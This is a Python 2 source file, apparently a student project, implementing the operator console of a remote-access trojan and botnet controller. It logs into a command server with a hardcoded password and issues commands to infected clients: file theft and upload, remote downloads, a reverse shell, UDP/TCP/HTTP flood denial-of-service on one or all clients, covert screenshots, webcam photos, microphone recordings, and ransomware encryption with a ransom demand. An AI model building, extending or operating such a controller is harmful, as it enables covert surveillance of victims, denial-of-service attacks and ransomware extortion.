import subprocess
import os
import sys
import time
import threading
import signal
import random
import readline
from socket import *
from threading import Thread


from modules import protocollo
from modules import comandi
from modules import console
from modules import utils

os.system ("clear")
print "##############################################################################"
print "#  Progetto di Advanced Computer Programming                                 #"
print "#  A cura di Salvatore Nitopi (Matricola: 895223)                            #"
print "#  Docente: Prof. Alberto Ceselli                                            #"
print "##############################################################################"

host = "127.0.0.1"
port = 5555
c_pwd = "password_console"#raw_input ("Password: ")

try:
	s=socket(AF_INET, SOCK_STREAM)
	s.connect((host,port))
	protocollo.send (s, "<_CONSOLE_>")

	protocollo.send (s, c_pwd)

	ac = comandi.Completatore(comandi.c_list)
	readline.set_completer(ac.complete)
	readline.parse_and_bind('tab: complete')

	while True:
		protocollo.send (s, "<_GETPATH_>")
		path = protocollo.recv (s)
		c = raw_input(path)

		while True:
			if c == "":
				print "[!] Nessun comando\n\n"

			elif c == "cmd_clear":
				print "[*] Pulizia in corso...\n\n"
				os.system("clear")

			elif c == "cmd_lpwd":
				print os.system("pwd")

			elif c == "cmd_lls":
				print os.system("ls")

			elif c.split()[0] == 'cmd_lcd':
				cf = c [ len(c.split()[0]) + 1 : ]
				try: os.chdir( cf )
				except: print "[!] Directory Errata\n\n"

			elif c.split()[0] == 'cmd_interact':
				cf = c [ len(c.split()[0]) + 1 : ]
				try: int(cf); break
				except: print "[!] ID client non valido\n\n"


			elif c == "cmd_help":
				print "############# HELP ###########################################"
				print "cmd_help\t\tMostra questo messaggio"
				print ""
				print "cmd_clear\t\tCancella la console"
				print "cmd_lpwd\t\tMostra la directory locale"
				print "cmd_lls\t\t\tMostra i file nella directory locale"
				print "cmd_lcd\t\t\tCambia la directory locale"
				print ""
				print "cmd_list\t\tMostra la lista dei client"
				print "cmd_interact\t\tScegle il client con cui interagire"
				print "cmd_stop\t\tFerma l'interazione con un client"
				print "cmd_exit\t\tEsce da questo script"
				print ""
				print "cmd_put\t\t\tCarica un file sul client"
				print "cmd_get\t\t\tScarica un file dal client"
				print "cmd_download\t\tScarica un file remoto sul client"
				print "cmd_reverse_shell\tLancia una reverse shell"
				print ""
				print "cmd_flood_add\t\tAggiunge un targhet flood (UDP/TCP/HTTP)"
				print "cmd_flood_remove\t\tRimuove i flood"
				print "cmd_flood_start\t\tAvvia l'attacco dos"
				print "global_flood_add\t\tAggiunge un targhet flood (UDP/TCP/HTTP)"
				print "global_flood_remove\t\tRimuove i flood"
				print "global_flood_start\t\tAvvia l'attacco dos su tutti i client"
				print ""
				print "cmd_screenshot\t\tCattura e visualizza uno screenshot"
				print "cmd_screenshot_save\tCattura e salva uno screenshot"
				print ""
				print "cmd_camera\t\tCattura e visualizza una foto"
				print "cmd_camera_save\t\tCattura e visualizza una foto"
				print ""
				print "cmd_mic\t\t\tRegistra e salva un clip audio in formato Wave"
				print ""
				print "cmd_ransome\t\tCifra i files e chiede un riscatto"
				print "cmd_unransome\t\tDecifra i files e chiede un riscatto"
				print ""
				print "cmd_msgbox\t\t\tInvia un messaggio"
				print ""
				print "cmd_functional\t\t\tEsegue l'esercizio di prog. funzionale"
				print "##############################################################\n\n"

			else:
				break

			readline.add_history(c)
			c = raw_input(path)


		if c == "cmd_exit":
			s.close ()
			sys.exit(0)


		elif c == "cmd_interact":
			protocollo.send (s, c)


		elif c.split()[0] == 'cmd_get':
			cf = c [ len(c.split()[0]) + 1 : ]
			print "[*] Downloading " + cf + " ..."
			protocollo.send (s, c)
			print protocollo.recv (s)
			try:
				l = protocollo.recv (s)
				if "<_ERROR_>" in l: 
					print "[!] Errore durante il download di: " + cf + "\n\n"
				else: 
					f = open(cf,'wb')
					f.write(l)
					f.close()
					print "[*] Scaricato: " + cf + "\n\n"
			except:
				print "[!] Errore durante il download di: " + cf + "\n\n"


		elif c.split()[0] == 'cmd_put':
			cf = c [ len(c.split()[0]) + 1 : ]
			print "[*] Uploading " + cf + " ..."
			try:
				f = open(cf,'rb')
				l = f.read()
				f.close()
				protocollo.send (s, c)
				protocollo.send (s, l)
				print protocollo.recv (s)
				print protocollo.recv (s)
				print "\n"
			except:
				print "[!] Errore durante l'upload di: " + cf + "\n\n"


		elif c.split()[0] == "cmd_screenshot":
			try:
				q = c.split()[1]		#FOR TESTING
				protocollo.send (s, c)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante l'acquisizione dello Screenshot\n\n"
				else:
					try: utils.open_img (scr)
					except: "[!] Nessuno screenshot valido\n\n"
			except:
				print "[!] Errore, usa questo comando:\ncmd_screenshot <quality 1-100>\n\n"


		elif c.split()[0] == "cmd_screenshot_save":
			try:
				quality = c.split()[1]
				protocollo.send (s, "cmd_screenshot " + quality)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante l'acquisizione dello Screenshot\n\n"
				else:
					try: utils.save_img("scr_" + str(time.strftime("%d%m%y_%H_%M_%S")) + ".jpg", scr)
					except: "[!] Nessuno screenshot valido\n\n"
			except:
				print "[!] Errore, usa questo comando:\ncmd_screenshot <quality 1-100>\n\n"



		elif c.split()[0] == "cmd_camera":
			try:
				q = c.split()[1]		#FOR TESTING
				protocollo.send (s, c)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante lo scatto della foto.\n\n"
				else:
					try: utils.open_img (scr)
					except: "[!] Nessuno scatto valido.\n\n"
			except:
				print "[!] Errore, usa questo comando:\ncmd_camera <quality 1-100>\n\n"


		elif c.split()[0] == "cmd_camera_save":
			try:
				quality = c.split()[1]
				protocollo.send (s, "cmd_camera " + quality)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante lo scatto della foto.\n\n"
				else:
					try: utils.save_img("cam_" + str(time.strftime("%d%m%y_%H_%M_%S")) + ".jpg", scr)
					except: "[!] Nessuno scatto valido.\n\n"
			except:
				print "[!] Errore, usa questo comando:\ncmd_camera <quality 1-100>\n\n"


		elif c.split()[0] == "cmd_mic":
			protocollo.send (s, c)
			print "[*] Registro Audio..."
			try:
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante la registrazione Audio\n\n"

				elif scr == "[!] Errore, usa: cmd_mic <quality 1-3> <duration>\n\n":
					print scr

				else:
					f = open("wav_" + str(time.strftime("%d%m%y_%H_%M_%S")) + ".wav",'wb')
					f.write(scr)
					f.close()
					print "[*] Audio Registrato\n\n"
			except:
				print "[!] Errore durante il salvataggio dell'audio\n\n"


		elif c.split()[0] == "cmd_ransome":
			try:
				k = c.split()[1]
				protocollo.send (s, c)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante la cifratura dei files\n\n"
				else:
					print scr
			except:
				print "[!] Errore, usa questo comando:\ncmd_ransome <key>\n\n"


		elif c.split()[0] == "cmd_unransome":
			try:
				k = c.split()[1]
				protocollo.send (s, c)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante la decifratura dei files\n\n"
				else:
					print scr
			except:
				print "[!] Errore, usa questo comando:\ncmd_unransome <key>\n\n"


		elif c.split()[0] == "cmd_msgbox":
			try:
				m = c.split()[1]
				protocollo.send (s, c)
				scr = protocollo.recv (s)
				if scr == "<_ERROR_>":
					print "[!] Errore durante l'invio del messaggio\n\n"
				else:
					print scr
			except:
				print "[!] Errore, usa questo comando:\ncmd_msgbox <message>\n\n"


		else:
			protocollo.send (s, c)
			print protocollo.recv (s)


	s.close()

except Exception, e:
	print "[!] Errore: " + str(e)